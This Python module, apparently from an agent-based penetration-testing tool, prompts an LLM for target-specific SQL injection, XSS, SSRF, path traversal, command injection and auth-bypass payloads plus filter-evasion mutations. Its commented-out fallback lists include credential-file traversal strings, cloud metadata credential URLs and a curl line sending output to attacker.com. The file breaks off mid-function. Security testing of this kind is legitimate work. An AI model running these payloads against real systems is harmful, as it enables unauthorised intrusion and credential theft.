"""
Creative Payload Generation using LLM.

This module replaces static payloads with dynamically generated,
context-aware payloads using AI reasoning. This is key to zero-day
discovery - the AI generates novel attack vectors tailored to each
specific target.

NO STATIC PAYLOADS - Everything is generated based on context.
"""
import asyncio
import json
import os
import re
from typing import Any, Dict, List, Optional
from datetime import datetime

from openai import AsyncOpenAI
from temporalio import activity

from agentex.lib.utils.logging import make_logger
from agentex.lib import adk
from agentex.types.text_content import TextContent

logger = make_logger(__name__)


async def call_llm(prompt: str, system_prompt: str, temperature: float = 0.8, max_tokens: int = 2000, heartbeat_msg: str = None, max_retries: int = 3) -> str:
    """Call LLM API for creative payload generation using OpenAI SDK with retry logic."""
    from temporalio import activity
    import httpx

    api_key = os.environ.get("OPENAI_API_KEY")
    base_url = os.environ.get("OPENAI_BASE_URL", "https://api.openai.com/v1")
    model = os.environ.get("OPENAI_MODEL", "gpt-4")

    if not api_key:
        raise ValueError("OPENAI_API_KEY not set")

    # Send heartbeat before long LLM call to prevent timeout
    def send_heartbeat(msg: str = None):
        try:
            activity.heartbeat(msg or heartbeat_msg or "Generating creative payloads via LLM...")
        except Exception:
            pass  # Not in activity context, skip heartbeat

    send_heartbeat()

    last_error = None
    for attempt in range(max_retries):
        try:
            # Send heartbeat before each attempt
            send_heartbeat(f"LLM call attempt {attempt + 1}/{max_retries}...")

            # Use OpenAI SDK for LLM calls with shorter timeout per attempt
            client = AsyncOpenAI(
                api_key=api_key,
                base_url=base_url,
                timeout=60.0,  # Shorter timeout per attempt
            )

            response = await client.chat.completions.create(
                model=model,
                messages=[
                    {"role": "system", "content": system_prompt},
                    {"role": "user", "content": prompt},
                ],
                temperature=temperature,  # Higher for creativity
                max_tokens=max_tokens,
            )

            return response.choices[0].message.content

        except asyncio.CancelledError:
            # Activity was cancelled - re-raise to let Temporal handle it
            logger.warning(f"LLM call cancelled on attempt {attempt + 1}")
            raise
        except (httpx.TimeoutException, httpx.ReadTimeout, httpx.ConnectTimeout) as e:
            last_error = e
            logger.warning(f"LLM call timeout on attempt {attempt + 1}/{max_retries}: {e}")
            if attempt < max_retries - 1:
                # Wait before retry with exponential backoff
                wait_time = (attempt + 1) * 2
                send_heartbeat(f"Retrying LLM call in {wait_time}s...")
                await asyncio.sleep(wait_time)
            continue
        except Exception as e:
            last_error = e
            logger.warning(f"LLM call failed on attempt {attempt + 1}/{max_retries}: {e}")
            if attempt < max_retries - 1:
                # Wait before retry
                wait_time = (attempt + 1) * 2
                send_heartbeat(f"Retrying LLM call in {wait_time}s...")
                await asyncio.sleep(wait_time)
            continue

    # All retries exhausted
    raise Exception(f"LLM call failed after {max_retries} attempts: {last_error}")


def parse_payloads_from_response(response: str) -> List[str]:
    """Extract payloads from LLM response."""
    payloads = []

    # Try to parse as JSON array first
    try:
        data = json.loads(response)
        if isinstance(data, list):
            for item in data:
                if isinstance(item, str):
                    payloads.append(item)
                elif isinstance(item, dict) and "payload" in item:
                    payloads.append(item["payload"])
            return payloads
    except json.JSONDecodeError:
        pass

    # Extract from markdown code blocks
    code_blocks = re.findall(r'```(?:\w+)?\n(.*?)\n```', response, re.DOTALL)
    for block in code_blocks:
        for line in block.strip().split('\n'):
            line = line.strip()
            if line and not line.startswith('#') and not line.startswith('//'):
                payloads.append(line)

    # Extract numbered or bulleted list items
    list_items = re.findall(r'(?:^|\n)\s*(?:\d+\.|[-*])\s*[`"]?([^`"\n]+)[`"]?', response)
    payloads.extend([item.strip() for item in list_items if item.strip()])

    # Extract quoted strings
    quoted = re.findall(r'[`"]([^`"]+)[`"]', response)
    payloads.extend([q.strip() for q in quoted if len(q) > 2])

    # Deduplicate while preserving order
    seen = set()
    unique_payloads = []
    for p in payloads:
        if p not in seen and len(p) > 1:
            seen.add(p)
            unique_payloads.append(p)

    return unique_payloads[:20]  # Limit to 20 payloads


# ============================================================================
# SQL INJECTION PAYLOAD GENERATION
# ============================================================================

SQLI_SYSTEM_PROMPT = """You are a world-class security researcher specializing in SQL injection attacks.
You think creatively about database exploitation and generate novel, context-aware payloads.
You understand different database backends (MySQL, PostgreSQL, SQLite, MSSQL, Oracle) and their quirks.
You know advanced techniques like time-based blind injection, error-based extraction, and filter bypasses."""

SQLI_PROMPT_TEMPLATE = """Generate creative SQL injection payloads for this specific context:

TARGET CONTEXT:
- URL: {url}
- Parameter: {parameter}
- Technologies detected: {technologies}
- Previous responses observed: {response_patterns}
- WAF/Filtering detected: {waf_info}

REQUIREMENTS:
1. Generate 10-15 UNIQUE payloads tailored to this specific target
2. Include payloads for different database types if tech stack is unknown
3. Include bypass techniques if WAF is detected
4. Think about:
   - Error-based injection (trigger verbose errors)
   - Union-based injection (extract data)
   - Boolean-based blind (true/false conditions)
   - Time-based blind (SLEEP, WAITFOR, pg_sleep)
   - Stacked queries (multiple statements)
   - Filter bypasses (encoding, case variation, comments)
5. Make payloads NOVEL - go beyond standard wordlists
6. Consider the parameter name for context (e.g., 'id' suggests numeric, 'search' suggests string)

OUTPUT FORMAT:
Return ONLY a JSON array of payload strings, nothing else:
["payload1", "payload2", ...]

Think creatively - a real attacker would craft payloads specifically for this target."""


async def generate_sqli_payloads(
    url: str,
    parameter: str,
    technologies: List[str] = None,
    response_patterns: str = "",
    waf_detected: bool = False,
) -> List[str]:
    """Generate creative SQL injection payloads using LLM."""
    technologies = technologies or []
    waf_info = "WAF or input filtering detected - include bypass techniques" if waf_detected else "No WAF detected"

    prompt = SQLI_PROMPT_TEMPLATE.format(
        url=url,
        parameter=parameter,
        technologies=", ".join(technologies) if technologies else "Unknown",
        response_patterns=response_patterns[:500] if response_patterns else "No patterns observed yet",
        waf_info=waf_info,
    )

    try:
        response = await call_llm(
            prompt,
            SQLI_SYSTEM_PROMPT,
            temperature=0.8,
            heartbeat_msg=f"Generating SQLi payloads for {parameter}..."
        )
        payloads = parse_payloads_from_response(response)
        logger.info(f"Generated {len(payloads)} creative SQLi payloads")
        return payloads if payloads else _get_fallback_sqli_payloads(parameter)
    except Exception as e:
        logger.warning(f"LLM payload generation failed: {e}, using intelligent fallback")
        return _get_fallback_sqli_payloads(parameter)


def _get_fallback_sqli_payloads(parameter: str) -> List[str]:
    """Intelligent fallback - still context-aware based on parameter name."""
    # HARDCODED PAYLOADS COMMENTED OUT - Use LLM generation instead
    # Determine if parameter is likely numeric or string based on name
    # numeric_hints = ['id', 'num', 'count', 'page', 'limit', 'offset', 'index', 'qty', 'amount']
    # is_numeric = any(hint in parameter.lower() for hint in numeric_hints)

    # if is_numeric:
    #     return [
    #         "1 OR 1=1",
    #         "1' OR '1'='1",
    #         "1 AND 1=2 UNION SELECT NULL,NULL,NULL--",
    #         "1; SELECT SLEEP(5)--",
    #         "1 AND (SELECT COUNT(*) FROM information_schema.tables)>0",
    #         "-1 OR 1=1",
    #         "1/*!50000OR*/1=1",
    #     ]
    # else:
    #     return [
    #         "' OR '1'='1",
    #         "' OR '1'='1'--",
    #         "' UNION SELECT NULL--",
    #         "'; WAITFOR DELAY '0:0:5'--",
    #         "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
    #         "admin'--",
    #         "' OR ''='",
    #     ]

    # Return empty list - LLM should be used for payload generation
    logger.warning(f"Fallback called for SQLi payloads on parameter '{parameter}' - LLM generation should be used")
    return []


# ============================================================================
# XSS PAYLOAD GENERATION
# ============================================================================

XSS_SYSTEM_PROMPT = """You are a world-class security researcher specializing in Cross-Site Scripting (XSS) attacks.
You think creatively about browser exploitation and DOM manipulation.
You understand different XSS contexts (HTML, JavaScript, attribute, URL) and their unique bypass techniques.
You know advanced techniques like mutation XSS, DOM clobbering, and CSP bypasses."""

XSS_PROMPT_TEMPLATE = """Generate creative XSS payloads for this specific context:

TARGET CONTEXT:
- URL: {url}
- Parameter: {parameter}
- Technologies detected: {technologies}
- Response content-type: {content_type}
- Reflection context observed: {reflection_context}
- Filters detected: {filters}

REQUIREMENTS:
1. Generate 10-15 UNIQUE payloads tailored to this context
2. Consider the reflection context:
   - HTML body: Use script tags, event handlers
   - HTML attribute: Break out of attribute, use event handlers
   - JavaScript: Break out of string/context
   - URL: javascript: protocol, data: URIs
3. Include filter bypass techniques:
   - Case variations
   - Encoding (HTML entities, URL encoding, Unicode)
   - Tag/attribute variations
   - Null bytes, newlines
4. Think about:
   - Classic reflected XSS
   - DOM-based XSS vectors
   - Mutation XSS for sanitizer bypass
   - Template injection if framework detected
5. Make payloads NOVEL - go beyond standard wordlists

OUTPUT FORMAT:
Return ONLY a JSON array of payload strings, nothing else:
["payload1", "payload2", ...]

Be creative - a real attacker would craft payloads specifically for this target's technology stack."""


async def generate_xss_payloads(
    url: str,
    parameter: str,
    technologies: List[str] = None,
    content_type: str = "text/html",
    reflection_context: str = "unknown",
    filters_detected: List[str] = None,
) -> List[str]:
    """Generate creative XSS payloads using LLM."""
    technologies = technologies or []
    filters_detected = filters_detected or []

    prompt = XSS_PROMPT_TEMPLATE.format(
        url=url,
        parameter=parameter,
        technologies=", ".join(technologies) if technologies else "Unknown",
        content_type=content_type,
        reflection_context=reflection_context,
        filters=", ".join(filters_detected) if filters_detected else "None detected",
    )

    try:
        response = await call_llm(
            prompt,
            XSS_SYSTEM_PROMPT,
            temperature=0.8,
            heartbeat_msg=f"Generating XSS payloads for {parameter}..."
        )
        payloads = parse_payloads_from_response(response)
        logger.info(f"Generated {len(payloads)} creative XSS payloads")
        return payloads if payloads else _get_fallback_xss_payloads(reflection_context)
    except Exception as e:
        logger.warning(f"LLM payload generation failed: {e}, using intelligent fallback")
        return _get_fallback_xss_payloads(reflection_context)


def _get_fallback_xss_payloads(context: str) -> List[str]:
    """Intelligent fallback based on reflection context."""
    # HARDCODED PAYLOADS COMMENTED OUT - Use LLM generation instead
    # if "attribute" in context.lower():
    #     return [
    #         '" onmouseover="alert(1)"',
    #         "' onfocus='alert(1)' autofocus='",
    #         '" onclick=alert(1)//',
    #         "javascript:alert(1)//",
    #         '" style="animation-name:x" onanimationstart="alert(1)"',
    #     ]
    # elif "javascript" in context.lower():
    #     return [
    #         "';alert(1)//",
    #         "\";alert(1)//",
    #         "</script><script>alert(1)</script>",
    #         "'-alert(1)-'",
    #         "\\';alert(1)//",
    #     ]
    # else:  # HTML body default
    #     return [
    #         "<img src=x onerror=alert(1)>",
    #         "<svg/onload=alert(1)>",
    #         "<body onload=alert(1)>",
    #         "<iframe srcdoc='<script>alert(1)</script>'>",
    #         "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
    #     ]

    # Return empty list - LLM should be used for payload generation
    logger.warning(f"Fallback called for XSS payloads in context '{context}' - LLM generation should be used")
    return []


# ============================================================================
# SSRF PAYLOAD GENERATION
# ============================================================================

SSRF_SYSTEM_PROMPT = """You are a world-class security researcher specializing in Server-Side Request Forgery (SSRF) attacks.
You think creatively about internal network access, cloud metadata exploitation, and protocol smuggling.
You understand different cloud providers (AWS, GCP, Azure, DigitalOcean) and their metadata endpoints.
You know advanced techniques like DNS rebinding, protocol smuggling, and filter bypasses."""

SSRF_PROMPT_TEMPLATE = """Generate creative SSRF payloads for this specific context:

TARGET CONTEXT:
- URL: {url}
- Parameter: {parameter}
- Technologies detected: {technologies}
- Cloud provider hints: {cloud_hints}
- URL validation observed: {url_validation}

REQUIREMENTS:
1. Generate 10-15 UNIQUE payloads tailored to this context
2. Include cloud metadata endpoints:
   - AWS: 169.254.169.254 (IMDSv1 and v2 bypass attempts)
   - GCP: metadata.google.internal
   - Azure: 169.254.169.254
   - DigitalOcean: 169.254.169.254
3. Include internal network probing:
   - localhost variations (127.0.0.1, 127.1, 0.0.0.0, [::1])
   - Common internal services (redis, elasticsearch, docker)
   - Internal IP ranges (10.x, 172.16.x, 192.168.x)
4. Include bypass techniques:
   - URL encoding
   - IPv6 notation
   - DNS rebinding domains
   - Protocol variations (http, https, gopher, file, dict)
   - Decimal/octal IP notation
   - URL parser differential
5. Think about the specific cloud provider if detected

OUTPUT FORMAT:
Return ONLY a JSON array of payload strings, nothing else:
["payload1", "payload2", ...]

Be creative - consider what internal services might be running based on the tech stack."""


async def generate_ssrf_payloads(
    url: str,
    parameter: str,
    technologies: List[str] = None,
    cloud_provider: str = None,
    url_validation_detected: str = "",
) -> List[str]:
    """Generate creative SSRF payloads using LLM."""
    technologies = technologies or []

    # Detect cloud hints from technologies
    cloud_hints = cloud_provider or "Unknown"
    if not cloud_provider:
        tech_str = " ".join(technologies).lower()
        if "aws" in tech_str or "amazon" in tech_str:
            cloud_hints = "AWS"
        elif "gcp" in tech_str or "google" in tech_str:
            cloud_hints = "GCP"
        elif "azure" in tech_str or "microsoft" in tech_str:
            cloud_hints = "Azure"

    prompt = SSRF_PROMPT_TEMPLATE.format(
        url=url,
        parameter=parameter,
        technologies=", ".join(technologies) if technologies else "Unknown",
        cloud_hints=cloud_hints,
        url_validation=url_validation_detected or "None detected",
    )

    try:
        response = await call_llm(
            prompt,
            SSRF_SYSTEM_PROMPT,
            temperature=0.8,
            heartbeat_msg=f"Generating SSRF payloads for {parameter}..."
        )
        payloads = parse_payloads_from_response(response)
        logger.info(f"Generated {len(payloads)} creative SSRF payloads")
        return payloads if payloads else _get_fallback_ssrf_payloads(cloud_hints)
    except Exception as e:
        logger.warning(f"LLM payload generation failed: {e}, using intelligent fallback")
        return _get_fallback_ssrf_payloads(cloud_hints)


def _get_fallback_ssrf_payloads(cloud_hints: str) -> List[str]:
    """Intelligent fallback based on cloud provider."""
    # HARDCODED PAYLOADS COMMENTED OUT - Use LLM generation instead
    # base_payloads = [
    #     "http://127.0.0.1/",
    #     "http://localhost/",
    #     "http://[::1]/",
    #     "http://0.0.0.0/",
    #     "http://127.1/",
    #     "http://2130706433/",  # 127.0.0.1 in decimal
    # ]

    # if "aws" in cloud_hints.lower():
    #     base_payloads.extend([
    #         "http://169.254.169.254/latest/meta-data/",
    #         "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    #         "http://[fd00:ec2::254]/latest/meta-data/",
    #     ])
    # elif "gcp" in cloud_hints.lower():
    #     base_payloads.extend([
    #         "http://metadata.google.internal/computeMetadata/v1/",
    #         "http://169.254.169.254/computeMetadata/v1/",
    #     ])
    # elif "azure" in cloud_hints.lower():
    #     base_payloads.extend([
    #         "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    #     ])
    # else:
    #     # Add all cloud providers if unknown
    #     base_payloads.extend([
    #         "http://169.254.169.254/latest/meta-data/",
    #         "http://metadata.google.internal/",
    #     ])

    # return base_payloads

    # Return empty list - LLM should be used for payload generation
    logger.warning(f"Fallback called for SSRF payloads with cloud hints '{cloud_hints}' - LLM generation should be used")
    return []


# ============================================================================
# PATH TRAVERSAL PAYLOAD GENERATION
# ============================================================================

PATH_TRAVERSAL_SYSTEM_PROMPT = """You are a world-class security researcher specializing in Path Traversal and Local File Inclusion attacks.
You think creatively about file system access, filter bypasses, and operating system differences.
You understand different OS path conventions (Unix/Linux, Windows) and their sensitive files.
You know advanced techniques like null byte injection, encoding bypasses, and path normalization exploits."""

PATH_TRAVERSAL_PROMPT_TEMPLATE = """Generate creative path traversal payloads for this specific context:

TARGET CONTEXT:
- URL: {url}
- Parameter: {parameter}
- Technologies detected: {technologies}
- Operating system hints: {os_hints}
- File extension filtering: {extension_filter}

REQUIREMENTS:
1. Generate 10-15 UNIQUE payloads tailored to this context
2. Target sensitive files based on OS:
   - Linux: /etc/passwd, /etc/shadow, /proc/self/environ, /var/log/
   - Windows: C:\\Windows\\win.ini, boot.ini, SAM, web.config
3. Include bypass techniques:
   - Various traversal sequences (../, ..\\, ..;/, ....//...)
   - Encoding (URL, double URL, Unicode)
   - Null byte injection (%00)
   - Path truncation
   - Wrapper protocols (php://, file://, zip://)
4. Consider the application type:
   - PHP: include files, proc/self/fd
   - Java: WEB-INF/web.xml
   - Node.js: package.json, .env
5. Think about what config files might exist based on tech stack

OUTPUT FORMAT:
Return ONLY a JSON array of payload strings, nothing else:
["payload1", "payload2", ...]

Be creative - consider what sensitive files might exist based on the technology stack."""


async def generate_path_traversal_payloads(
    url: str,
    parameter: str,
    technologies: List[str] = None,
    os_hint: str = "unknown",
    extension_filter: str = "",
) -> List[str]:
    """Generate creative path traversal payloads using LLM."""
    technologies = technologies or []

    # Detect OS hints from technologies
    tech_str = " ".join(technologies).lower()
    if os_hint == "unknown":
        if "windows" in tech_str or "iis" in tech_str or "asp" in tech_str:
            os_hint = "Windows"
        elif "linux" in tech_str or "nginx" in tech_str or "apache" in tech_str:
            os_hint = "Linux/Unix"

    prompt = PATH_TRAVERSAL_PROMPT_TEMPLATE.format(
        url=url,
        parameter=parameter,
        technologies=", ".join(technologies) if technologies else "Unknown",
        os_hints=os_hint,
        extension_filter=extension_filter or "None detected",
    )

    try:
        response = await call_llm(
            prompt,
            PATH_TRAVERSAL_SYSTEM_PROMPT,
            temperature=0.8,
            heartbeat_msg=f"Generating path traversal payloads for {parameter}..."
        )
        payloads = parse_payloads_from_response(response)
        logger.info(f"Generated {len(payloads)} creative path traversal payloads")
        return payloads if payloads else _get_fallback_path_traversal_payloads(os_hint)
    except Exception as e:
        logger.warning(f"LLM payload generation failed: {e}, using intelligent fallback")
        return _get_fallback_path_traversal_payloads(os_hint)


def _get_fallback_path_traversal_payloads(os_hint: str) -> List[str]:
    """Intelligent fallback based on OS."""
    # HARDCODED PAYLOADS COMMENTED OUT - Use LLM generation instead
    # if "windows" in os_hint.lower():
    #     return [
    #         "..\\..\\..\\..\\windows\\win.ini",
    #         "....//....//....//windows/win.ini",
    #         "..%5c..%5c..%5cwindows%5cwin.ini",
    #         "..\\..\\..\\..\\..\\..\\boot.ini",
    #         "....\\\\....\\\\windows\\\\system32\\\\config\\\\SAM",
    #     ]
    # else:  # Linux/Unix default
    #     return [
    #         "../../../etc/passwd",
    #         "....//....//....//etc/passwd",
    #         "..%2f..%2f..%2fetc%2fpasswd",
    #         "../../../proc/self/environ",
    #         "....//....//....//etc/shadow",
    #         "../../../var/log/apache2/access.log",
    #         "php://filter/convert.base64-encode/resource=/etc/passwd",
    #     ]

    # Return empty list - LLM should be used for payload generation
    logger.warning(f"Fallback called for path traversal payloads with OS hint '{os_hint}' - LLM generation should be used")
    return []


# ============================================================================
# COMMAND INJECTION PAYLOAD GENERATION
# ============================================================================

CMDI_SYSTEM_PROMPT = """You are a world-class security researcher specializing in Command Injection attacks.
You think creatively about shell exploitation, command chaining, and filter bypasses.
You understand different shell environments (bash, sh, cmd, PowerShell) and their syntax.
You know advanced techniques like blind command injection, out-of-band data exfiltration, and filter bypasses."""

CMDI_PROMPT_TEMPLATE = """Generate creative command injection payloads for this specific context:

TARGET CONTEXT:
- URL: {url}
- Parameter: {parameter}
- Technologies detected: {technologies}
- Operating system hints: {os_hints}
- Filtering observed: {filtering}

REQUIREMENTS:
1. Generate 10-15 UNIQUE payloads tailored to this context
2. Include different injection techniques:
   - Command separators (; | & && ||)
   - Command substitution ($(), ``, %0a)
   - Argument injection (-flag, --option)
3. Target appropriate commands for OS:
   - Linux: id, whoami, cat, ls, sleep, curl, wget
   - Windows: whoami, dir, type, ping, timeout
4. Include bypass techniques:
   - Encoding (URL, hex, octal)
   - Quoting variations
   - Wildcard abuse
   - Variable expansion
   - Null bytes, newlines
5. Include time-based blind injection (sleep, ping)
6. Consider out-of-band techniques (DNS, HTTP callbacks)

OUTPUT FORMAT:
Return ONLY a JSON array of payload strings, nothing else:
["payload1", "payload2", ...]

Be creative - consider the specific application context and what commands would be impactful."""


async def generate_command_injection_payloads(
    url: str,
    parameter: str,
    technologies: List[str] = None,
    os_hint: str = "unknown",
    filtering_detected: str = "",
) -> List[str]:
    """Generate creative command injection payloads using LLM."""
    technologies = technologies or []

    # Detect OS hints
    tech_str = " ".join(technologies).lower()
    if os_hint == "unknown":
        if "windows" in tech_str or "iis" in tech_str:
            os_hint = "Windows"
        else:
            os_hint = "Linux/Unix"

    prompt = CMDI_PROMPT_TEMPLATE.format(
        url=url,
        parameter=parameter,
        technologies=", ".join(technologies) if technologies else "Unknown",
        os_hints=os_hint,
        filtering=filtering_detected or "None detected",
    )

    try:
        response = await call_llm(
            prompt,
            CMDI_SYSTEM_PROMPT,
            temperature=0.8,
            heartbeat_msg=f"Generating command injection payloads for {parameter}..."
        )
        payloads = parse_payloads_from_response(response)
        logger.info(f"Generated {len(payloads)} creative command injection payloads")
        return payloads if payloads else _get_fallback_cmdi_payloads(os_hint)
    except Exception as e:
        logger.warning(f"LLM payload generation failed: {e}, using intelligent fallback")
        return _get_fallback_cmdi_payloads(os_hint)


def _get_fallback_cmdi_payloads(os_hint: str) -> List[str]:
    """Intelligent fallback based on OS."""
    # HARDCODED PAYLOADS COMMENTED OUT - Use LLM generation instead
    # if "windows" in os_hint.lower():
    #     return [
    #         "& whoami",
    #         "| dir",
    #         "; ping -n 5 127.0.0.1",
    #         "|| timeout 5",
    #         "%0awhoami",
    #         "& type C:\\Windows\\win.ini",
    #     ]
    # else:
    #     return [
    #         "; id",
    #         "| whoami",
    #         "& cat /etc/passwd",
    #         "`sleep 5`",
    #         "$(id)",
    #         "; curl http://attacker.com/$(whoami)",
    #         "%0aid",
    #     ]

    # Return empty list - LLM should be used for payload generation
    logger.warning(f"Fallback called for command injection payloads with OS hint '{os_hint}' - LLM generation should be used")
    return []


# ============================================================================
# AUTH BYPASS PAYLOAD GENERATION
# ============================================================================

AUTH_BYPASS_SYSTEM_PROMPT = """You are a world-class security researcher specializing in Authentication Bypass techniques.
You think creatively about access control weaknesses, session manipulation, and authorization flaws.
You understand different authentication mechanisms and their common vulnerabilities.
You know advanced techniques like JWT attacks, OAuth flaws, and header manipulation."""

AUTH_BYPASS_PROMPT_TEMPLATE = """Generate creative authentication bypass techniques for this specific context:

TARGET CONTEXT:
- URL: {url}
- Technologies detected: {technologies}
- Authentication type detected: {auth_type}
- Response patterns: {response_patterns}

REQUIREMENTS:
1. Generate 10-15 UNIQUE bypass techniques
2. Include HTTP header manipulation:
   - X-Original-URL, X-Rewrite-URL
   - X-Forwarded-For, X-Real-IP
   - X-Custom-IP-Authorization
3. Include HTTP method manipulation:
   - Method override (_method, X-HTTP-Method-Override)
   - Different HTTP verbs (TRACE, OPTIONS)
4. Include path manipulation:
   - Case variation (/Admin vs /admin)
   - Path normalization (/./admin, //admin)
   - URL encoding
5. Include session/token attacks if applicable
6. Consider the specific technology stack

OUTPUT FORMAT:
Return a JSON array of technique objects:
[
  {{"type": "header", "header": "X-Original-URL", "value": "/admin"}},
  {{"type": "method", "method": "POST", "url_suffix": "?_method=GET"}},
  {{"type": "path", "modification": "/./admin"}}
]"""


async def generate_auth_bypass_techniques(
    url: str,
    technologies: List[str] = None,
    auth_type: str = "unknown",
    response_patterns: str = "",
) -> List[Dict[str, Any]]:
    """Generate creative authentication bypass techniques using LLM."""
    technologies = technologies or []

    prompt = AUTH_BYPASS_PROMPT_TEMPLATE.format(
        url=url,
        technologies=", ".join(technologies) if technologies else "Unknown",
        auth_type=auth_type,
        response_patterns=response_patterns[:300] if response_patterns else "None observed",
    )

    try:
        response = await call_llm(
            prompt,
            AUTH_BYPASS_SYSTEM_PROMPT,
            temperature=0.7,
            heartbeat_msg=f"Generating auth bypass techniques for {url}..."
        )

        # Try to parse as JSON
        try:
            techniques = json.loads(response)
            if isinstance(techniques, list):
                logger.info(f"Generated {len(techniques)} creative auth bypass techniques")
                return techniques
        except json.JSONDecodeError:
            pass

        # Fallback parsing
        return _get_fallback_auth_bypass_techniques()

    except Exception as e:
        logger.warning(f"LLM technique generation failed: {e}, using fallback")
        return _get_fallback_auth_bypass_techniques()


def _get_fallback_auth_bypass_techniques() -> List[Dict[str, Any]]:
    """Fallback auth bypass techniques."""
    # HARDCODED PAYLOADS COMMENTED OUT - Use LLM generation instead
    # return [
    #     {"type": "header", "header": "X-Original-URL", "value": "/admin"},
    #     {"type": "header", "header": "X-Rewrite-URL", "value": "/admin"},
    #     {"type": "header", "header": "X-Forwarded-For", "value": "127.0.0.1"},
    #     {"type": "header", "header": "X-Forwarded-Host", "value": "localhost"},
    #     {"type": "header", "header": "X-Custom-IP-Authorization", "value": "127.0.0.1"},
    #     {"type": "method", "method": "POST", "url_suffix": "?_method=GET"},
    #     {"type": "method", "method": "TRACE", "url_suffix": ""},
    #     {"type": "path", "modification": "/../admin"},
    #     {"type": "path", "modification": "/./admin"},
    #     {"type": "path", "modification": "/admin/..;/admin"},
    # ]

    # Return empty list - LLM should be used for payload generation
    logger.warning("Fallback called for auth bypass techniques - LLM generation should be used")
    return []


# ============================================================================
# FUZZING PAYLOAD GENERATION
# ============================================================================

FUZZING_SYSTEM_PROMPT = """You are a world-class security researcher specializing in fuzzing and edge case discovery.
You think creatively about input validation weaknesses, type confusion, and boundary conditions.
You understand different data types and their exploitation potential.
You know techniques for triggering errors, overflows, and unexpected behaviors."""

FUZZING_PROMPT_TEMPLATE = """Generate creative fuzzing payloads for this specific context:

TARGET CONTEXT:
- URL: {url}
- Parameter: {parameter}
- Parameter type hint: {param_type}
- Technologies detected: {technologies}
- Previous responses: {response_patterns}

REQUIREMENTS:
1. Generate 15-20 UNIQUE fuzzing values
2. Include boundary conditions:
   - Empty values, null, undefined
   - Very long strings
   - Negative numbers, zero, MAX_INT
   - Special floating point (NaN, Infinity)
3. Include type confusion:
   - Arrays: [], [1,2,3], {"$gt": ""}
   - Objects: {}, {"key": "value"}
   - Boolean: true, false, 0, 1
4. Include special characters:
   - Null bytes, newlines, tabs
   - Unicode, emoji
   - Control characters
5. Include format strings if applicable
6. Consider what would cause errors or unexpected behavior

OUTPUT FORMAT:
Return ONLY a JSON array of fuzzing values:
["value1", "value2", ...]

Be creative - think about what edge cases developers might miss."""


async def generate_fuzzing_payloads(
    url: str,
    parameter: str,
    technologies: List[str] = None,
    param_type: str = "unknown",
    response_patterns: str = "",
) -> List[str]:
    """Generate creative fuzzing payloads using LLM."""
    technologies = technologies or []

    prompt = FUZZING_PROMPT_TEMPLATE.format(
        url=url,
        parameter=parameter,
        param_type=param_type,
        technologies=", ".join(technologies) if technologies else "Unknown",
        response_patterns=response_patterns[:300] if response_patterns else "None observed",
    )

    try:
        response = await call_llm(
            prompt,
            FUZZING_SYSTEM_PROMPT,
            temperature=0.9,  # Higher temp for variety
            heartbeat_msg=f"Generating fuzzing payloads for {parameter}..."
        )
        payloads = parse_payloads_from_response(response)
        logger.info(f"Generated {len(payloads)} creative fuzzing payloads")
        return payloads if payloads else _get_fallback_fuzzing_payloads(param_type)
    except Exception as e:
        logger.warning(f"LLM payload generation failed: {e}, using fallback")
        return _get_fallback_fuzzing_payloads(param_type)


def _get_fallback_fuzzing_payloads(param_type: str) -> List[str]:
    """Intelligent fallback based on parameter type."""
    # HARDCODED PAYLOADS COMMENTED OUT - Use LLM generation instead
    # base = [
    #     "",
    #     "null",
    #     "undefined",
    #     "NaN",
    #     "true",
    #     "false",
    #     "[]",
    #     "{}",
    #     "-1",
    #     "0",
    #     "9999999999999999999",
    #     "A" * 1000,
    #     "../",
    #     "%00",
    #     "\n",
    #     "\r\n",
    #     "{{7*7}}",
    #     "${7*7}",
    # ]
    # return base

    # Return empty list - LLM should be used for payload generation
    logger.warning(f"Fallback called for fuzzing payloads with param type '{param_type}' - LLM generation should be used")
    return []


# ============================================================================
# PAYLOAD MUTATION ENGINE
# ============================================================================

async def mutate_payload(
    payload: str,
    mutation_type: str = "all",
    count: int = 5,
) -> List[str]:
    """
    Mutate a payload to generate variations for filter bypass.

    This is useful when a base payload is blocked - generate
    variations that might bypass the filter.
    """
    prompt = f"""Mutate this security testing payload to bypass filters:

ORIGINAL PAYLOAD: {payload}
MUTATION TYPE: {mutation_type}

Generate {count} variations using techniques like:
- URL encoding (single, double)
- Unicode/UTF-8 variations
- Case variations
- Comment insertion
- Null byte injection
- Whitespace variations
- Character alternatives

Return ONLY a JSON array of mutated payloads:
["mutation1", "mutation2", ...]"""

    system = "You are an expert at generating payload mutations to bypass security filters. Think creatively about encoding and obfuscation techniques."

    try:
        response = await call_llm(
            prompt,
            system,
            temperature=0.8,
            max_tokens=1000,
            heartbeat_msg="Mutating payload for filter bypass..."
        )
        mutations = parse_payloads_from_response(response)
        return mutations if mutations else [payload]  # Return original if no mutations
    except Exception as e:
        logger.warning(f"Payload mutation failed: {e}")
        return [payload]


# ============================================================================
# ACTIVITY DEFINITIONS FOR TEMPORAL
# ============================================================================

@activity.defn(name="generate_creative_payloads_activity")
async def generate_creative_payloads_activity(
    vuln_type: str,
    url: str,
    parameter: str,
    context: Dict[str, Any],
    task_id: str = None,
    trace_id: str = None,
) -> Dict[str, Any]:
    """
    Generate creative payloads for a specific vulnerability type.

    This is the main entry point for creative payload generation.
    """
    technologies = context.get("technologies", [])

    # Vuln type display names
    vuln_type_names = {
        "sqli": "SQL Injection",
        "xss": "Cross-Site Scripting (XSS)",
        "ssrf": "Server-Side Request Forgery (SSRF)",
        "path_traversal": "Path Traversal",
        "cmdi": "Command Injection",
        "fuzzing": "Fuzzing",
    }
    vuln_display_name = vuln_type_names.get(vuln_type, vuln_type.upper())

    if vuln_type == "sqli":
        payloads = await generate_sqli_payloads(
            url, parameter, technologies,
            context.get("response_patterns", ""),
            context.get("waf_detected", False),
        )
    elif vuln_type == "xss":
        payloads = await generate_xss_payloads(
            url, parameter, technologies,
            context.get("content_type", "text/html"),
            context.get("reflection_context", "unknown"),
            context.get("filters_detected", []),
        )
    elif vuln_type == "ssrf":
        payloads = await generate_ssrf_payloads(
            url, parameter, technologies,
            context.get("cloud_provider"),
            context.get("url_validation", ""),
        )
    elif vuln_type == "path_traversal":
        payloads = await generate_path_traversal_payloads(
            url, parameter, technologies,
            context.get("os_hint", "unknown"),
            context.get("extension_filter", ""),
        )
    elif vuln_type == "cmdi":
